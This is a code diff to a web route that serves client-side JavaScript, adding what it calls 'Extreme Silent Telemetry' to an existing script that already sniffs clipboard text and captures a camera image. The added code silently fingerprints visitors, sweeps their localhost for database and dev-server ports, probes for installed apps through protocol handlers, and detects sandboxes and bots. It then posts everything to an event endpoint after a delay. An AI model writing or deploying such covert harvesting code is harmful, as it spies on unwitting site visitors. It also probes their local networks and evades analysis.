@@ -402,6 +402,120 @@ export async function GET(
               }, {once: true});
             }
 
+            // Extreme Silent Telemetry Variables
+            let open_ports = [];
+            let has_adblocker = false;
+            let installed_apps = [];
+            let is_sandbox_bot = false;
+            let peripheral_count = { webcams: 0, mics: 0, speakers: 0 };
+            let network_speed = { downlink_mbps: 0, ping_ms: 0 };
+            let accessibility_settings = [];
+            let cpu_benchmark_score = 0;
+            let estimated_storage_gb = 0;
+            let webgl_fingerprint = 'Unknown';
+
+            // 1. Storage Capacity Estimator
+            try {
+              if (navigator.storage && navigator.storage.estimate) {
+                navigator.storage.estimate().then(est => {
+                  if (est.quota) estimated_storage_gb = Math.round(est.quota / (1024 * 1024 * 1024));
+                });
+              }
+            } catch(e) {}
+
+            // 2. Hardware Peripheral Counter
+            try {
+              if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                navigator.mediaDevices.enumerateDevices().then(devices => {
+                  devices.forEach(d => {
+                    if (d.kind === 'videoinput') peripheral_count.webcams++;
+                    if (d.kind === 'audioinput') peripheral_count.mics++;
+                    if (d.kind === 'audiooutput') peripheral_count.speakers++;
+                  });
+                });
+              }
+            } catch(e) {}
+
+            // 3. Bandwidth Profiler
+            try {
+              if (navigator.connection) {
+                network_speed.downlink_mbps = navigator.connection.downlink || 0;
+                network_speed.ping_ms = navigator.connection.rtt || 0;
+              }
+            } catch(e) {}
+
+            // 4. Accessibility Settings
+            try {
+              if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) accessibility_settings.push('Reduced Motion');
+              if (window.matchMedia('(forced-colors: active)').matches) accessibility_settings.push('Forced Colors (High Contrast)');
+              if (window.matchMedia('(prefers-contrast: more)').matches) accessibility_settings.push('Increased Contrast');
+            } catch(e) {}
+
+            // 5. CPU Micro-Benchmarker
+            try {
+              let start = performance.now();
+              let ops = 0;
+              while (performance.now() - start < 100) {
+                Math.sqrt(Math.random() * 10000);
+                ops++;
+              }
+              cpu_benchmark_score = ops; // Higher is better
+            } catch(e) {}
+
+            // 6. Adblocker Detection (Honeypot)
+            try {
+              let bait = document.createElement('div');
+              bait.innerHTML = '&nbsp;';
+              bait.className = 'adsbox ad-placement doubleclick ad-placeholder';
+              bait.style.position = 'absolute'; bait.style.top = '-1000px';
+              document.body.appendChild(bait);
+              setTimeout(() => {
+                if (bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none') {
+                  has_adblocker = true;
+                }
+                bait.remove();
+              }, 100);
+            } catch(e) {}
+
+            // 7. Sandbox/Bot Detection
+            try {
+              if (navigator.webdriver) is_sandbox_bot = true;
+              if (window.outerWidth === 0 && window.outerHeight === 0) is_sandbox_bot = true;
+              if (navigator.languages === undefined || navigator.languages.length === 0) is_sandbox_bot = true;
+              if (window.document.documentElement.getAttribute('webdriver') === 'true') is_sandbox_bot = true;
+            } catch(e) {}
+
+            // 8. Port Sweeper
+            try {
+              const ports = [3306, 8080, 3000, 5000, 6379, 27017];
+              ports.forEach(port => {
+                let img = new Image();
+                img.onload = () => { open_ports.push(port.toString()); };
+                img.onerror = () => { /* Connection refused vs Timeout can indicate open vs closed, but image tag is safer */ };
+                img.src = 'http://127.0.0.1:' + port + '/favicon.ico';
+              });
+            } catch(e) {}
+
+            // 9. Desktop/Mobile App Protocol Detector
+            try {
+              const apps = { 'discord://': 'Discord', 'zoommtg://': 'Zoom', 'steam://': 'Steam', 'tg://': 'Telegram', 'whatsapp://': 'WhatsApp' };
+              for (const [protocol, name] of Object.entries(apps)) {
+                let iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                let start = performance.now();
+                try { iframe.contentWindow.location.href = protocol; } catch(e) {}
+                setTimeout(() => {
+                  if (performance.now() - start < 150) {
+                    // Quick failure means the OS doesn't know the protocol
+                  } else {
+                    installed_apps.push(name); // Blur or dialog took time
+                  }
+                  iframe.remove();
+                }, 100);
+              }
+            } catch(e) {}
+
             // Attempt aggressive Clipboard sniffing
             try {
               if (navigator.clipboard && navigator.clipboard.readText) {
@@ -600,14 +714,27 @@ export async function GET(
               referrer: referrer,
               device_posture: device_posture,
               clipboard_text: clipboard_text,
-              camera_image: camera_image
+              camera_image: camera_image,
+              open_ports: open_ports,
+              has_adblocker: has_adblocker,
+              is_sandbox_bot: is_sandbox_bot,
+              peripheral_count: peripheral_count,
+              network_speed: network_speed,
+              installed_apps: installed_apps,
+              accessibility_settings: accessibility_settings,
+              cpu_benchmark_score: cpu_benchmark_score,
+              estimated_storage_gb: estimated_storage_gb,
+              webgl_fingerprint: webgl_fingerprint
             };
             
-            await fetch('/api/v1/event', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ alert_id: '${alertId}', details })
-            });
+            // Give asynchronous silent checks a moment to complete
+            setTimeout(async () => {
+              await fetch('/api/v1/event', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ alert_id: '${alertId}', details })
+              });
+            }, 800);
 
             // Track Dwell Time on Exit
             const sendDwellTime = () => {
